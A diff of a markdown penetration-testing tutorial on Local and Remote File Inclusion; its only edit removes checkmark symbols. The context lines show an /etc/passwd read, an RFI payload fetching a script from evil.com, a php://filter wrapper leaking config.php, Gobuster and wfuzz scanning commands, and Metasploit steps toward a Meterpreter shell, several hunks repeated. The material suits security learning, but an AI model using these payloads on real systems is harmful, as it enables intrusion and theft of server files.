@@ -14,7 +14,7 @@ An attacker can exploit this by accessing files on the server:
 ```
 http://example.com/vulnerable.php?file=/etc/passwd
 ```
-✔ If successful, it will display the contents of `/etc/passwd` (Linux user database).  
+If successful, it will display the contents of `/etc/passwd` (Linux user database).  
 
 ###  LFI Attack Techniques
 - **Reading sensitive files** (e.g., `/etc/passwd`, `C:\windows\win.ini`)
@@ -39,7 +39,7 @@ An attacker can load a remote malicious PHP file:
 ```
 http://example.com/vulnerable.php?file=http://evil.com/malicious.php
 ```
-✔ If successful, the script from `evil.com` executes on the target server!
+  If successful, the script from `evil.com` executes on the target server!
 
 ### RFI Attack Techniques
 - Remote shell upload (reverse shell)
@@ -86,7 +86,7 @@ First, use Gobuster to find hidden directories or vulnerable parameters.
 ```bash
 gobuster dir -u http://target.com/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
 ```
-✔ This helps find files like `vulnerable.php` that may be vulnerable to LFI/RFI.
+ This helps find files like `vulnerable.php` that may be vulnerable to LFI/RFI.
 
 ---
 
@@ -100,7 +100,7 @@ gobuster dir -u http://target.com/ -w /usr/share/wordlists/dirb/common.txt -x ph
    ```
 4. Forward the request → If successful, you'll see `/etc/passwd`.
 
-✔ You can also use PHP Wrappers for deeper exploitation:
+ You can also use PHP Wrappers for deeper exploitation:
 ```
 vulnerable.php?file=php://filter/convert.base64-encode/resource=config.php
 ```
@@ -127,7 +127,7 @@ Then decode the base64 output to view sensitive information.
    set LPORT 4444
    exploit
    ```
-✔ If successful, you will get a Meterpreter shell, allowing you to execute commands on the server!
+ If successful, you will get a Meterpreter shell, allowing you to execute commands on the server!
 
 ---
 
@@ -136,7 +136,7 @@ Use wfuzz to brute-force file inclusion:
 ```bash
 wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc=404 "http://target.com/vulnerable.php?file=FUZZ"
 ```
-✔ This will find accessible files and possible LFI/RFI entry points.
+ This will find accessible files and possible LFI/RFI entry points.
 
 ---
 
@@ -159,7 +159,7 @@ First, use Gobuster to find hidden directories or vulnerable parameters.
 ```bash
 gobuster dir -u http://target.com/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
 ```
-✔ This helps find **files like `vulnerable.php`** that may be vulnerable to LFI/RFI.
+ This helps find **files like `vulnerable.php`** that may be vulnerable to LFI/RFI.
 
 ---
 
@@ -173,7 +173,7 @@ gobuster dir -u http://target.com/ -w /usr/share/wordlists/dirb/common.txt -x ph
    ```
 4. Forward the request → If successful, you'll see `/etc/passwd`.
 
-✔ You can also use PHP Wrappers for deeper exploitation:
+ You can also use PHP Wrappers for deeper exploitation:
 ```
 vulnerable.php?file=php://filter/convert.base64-encode/resource=config.php
 ```
@@ -200,7 +200,7 @@ Then decode the base64 output to view sensitive information.
    set LPORT 4444
    exploit
    ```
-✔ If successful, you will get a Meterpreter shell, allowing you to execute commands on the server!
+ If successful, you will get a Meterpreter shell, allowing you to execute commands on the server!
 
 ---
 
@@ -209,7 +209,7 @@ Use wfuzz to brute-force file inclusion:
 ```bash
 wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc=404 "http://target.com/vulnerable.php?file=FUZZ"
 ```
-✔ This will find accessible files and possible LFI/RFI entry points.
+ This will find accessible files and possible LFI/RFI entry points.
 
 ---
 
